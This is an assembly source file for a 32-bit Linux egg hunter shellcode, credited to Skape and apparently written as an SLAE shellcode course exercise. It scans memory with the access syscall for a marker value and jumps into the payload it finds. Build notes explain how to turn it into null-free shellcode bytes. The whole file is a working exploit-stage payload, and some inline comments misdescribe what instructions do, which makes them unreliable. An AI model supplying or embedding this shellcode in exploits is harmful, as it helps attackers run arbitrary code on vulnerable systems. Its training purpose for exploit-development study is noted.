; Executable name       : egg2
; Designed OS           : Linux (32-bit)
; Author                : Skape
; Version               : 1.0
; Created Following     : SLAE
; Description		: An example of the egg hunter technique via
;			  access(2) revisted. This is 99.9% Skapes
;			  code the only difference was zero-ing out
;			  ECX, EDX, and EAX.
;
; Skapes awesome paper:
;	http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;
; Build using these commands:
;	make
;	./objdump2shellcode.py -d egg2 -f c -b "\x00"
;

SECTION .text

global _start

_start:
	xor ecx,ecx		; zero out ECX
	pop eax			; POP 0 in EAX
	cdq			; mov EDX = 0

next_page:
	or dx,0xfff		; bitwise OR operation on low 16 bits

inc_addr:
	inc edx			; this operation makes EDX = 0x100
	lea ebx,[edx+0x4]	; PUSH all general purpose registers
	push 0x21		; PUSH 33 or access syscall
	pop eax			; POP 33 into EAX
	int 0x80		; call the kernel!!
	cmp al,0xf2		; compare return against EFAULT
	jz next_page		; if the ZF flag is set, EGG no in page
	mov eax,0x50905090	; this is our egg
	mov edi,edx		; if first scasd comparison fails EDI will
				; still point four bytes past where it originaly 
				; was

	scasd			; compare EDI and EAX (scasd inrements by 4 after)
	jnz inc_addr		; if they don't match loop back to increment addr
	scasd			; compare EAX to EDI+4 (scasd +4 per comparison)
	jnz inc_addr		; if they don't match loop back to increment addr
	jmp edi			; JMP to out shellcode we got found EGGY!!
